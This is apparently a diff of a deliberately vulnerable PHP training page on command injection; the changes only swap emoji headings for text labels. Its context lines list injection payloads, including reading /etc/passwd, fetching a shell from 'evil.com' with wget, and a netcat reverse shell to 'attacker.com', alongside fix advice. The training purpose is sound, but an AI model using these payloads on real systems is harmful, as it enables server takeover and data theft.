@@ -89,14 +89,14 @@ if(isset($_POST['backup'])) {
 </head>
 <body>
     <div class="warning-banner">
-        ⚠️ VULNERABLE VERSION - FOR SECURITY TRAINING ONLY ⚠️
+        WARNING: VULNERABLE VERSION - FOR SECURITY TRAINING ONLY WARNING:
     </div>
     
     <div class="container">
         <div class="row">
             <div class="col-md-10 offset-md-1">
                 <div class="vulnerability-info">
-                    <h5>🎯 Training Target: Command Injection</h5>
+                    <h5>TARGET: Training Target: Command Injection</h5>
                     <p><strong>Vulnerabilities Present:</strong></p>
                     <ul>
                         <li>Direct execution of user input in shell commands</li>
@@ -184,7 +184,7 @@ if(isset($_POST['backup'])) {
                 <?php endif; ?>
 
                 <div class="vulnerability-info">
-                    <h6>💡 Learning Points:</h6>
+                    <h6>TIP: Learning Points:</h6>
                     <ol>
                         <li>User input is directly concatenated into shell commands</li>
                         <li>No input validation or sanitization is performed</li>
@@ -192,7 +192,7 @@ if(isset($_POST['backup'])) {
                         <li>Dangerous PHP functions execute arbitrary commands</li>
                     </ol>
                     
-                    <h6>🔍 Command Injection Techniques:</h6>
+                    <h6>SEARCH: Command Injection Techniques:</h6>
                     <pre>Semicolon (;):     127.0.0.1; whoami
 AND operator (&&): 127.0.0.1 && cat /etc/passwd  
 OR operator (||):  invalid || ls -la
@@ -201,7 +201,7 @@ Backticks (`):     127.0.0.1`whoami`
 Command sub ($):   127.0.0.1$(whoami)
 Newline (%0a):     127.0.0.1%0awhoami</pre>
                     
-                    <h6>🎯 What You Can Do:</h6>
+                    <h6>TARGET: What You Can Do:</h6>
                     <pre>Read files:        ; cat /etc/passwd
 List directories:  && ls -la /
 View environment:  ; env
@@ -213,7 +213,7 @@ Create files:      && touch /tmp/hacked.txt
 Download shell:    ; wget http://evil.com/shell.php
 Reverse shell:     && nc -e /bin/sh attacker.com 4444</pre>
                     
-                    <h6>🛡️ How to Fix:</h6>
+                    <h6>FIX: How to Fix:</h6>
                     <pre>1. Never pass user input to shell commands
 2. Use built-in PHP functions instead:
    - Use fsockopen() instead of ping
@@ -234,7 +234,7 @@ if(in_array($_POST['host'], $allowed_hosts)) {
                 </div>
 
                 <div class="vulnerability-info mt-3">
-                    <h6>⚠️ Real-World Impact:</h6>
+                    <h6>WARNING: Real-World Impact:</h6>
                     <ul>
                         <li><strong>Remote Code Execution (RCE):</strong> Complete server takeover</li>
                         <li><strong>Data Exfiltration:</strong> Steal sensitive files and databases</li>
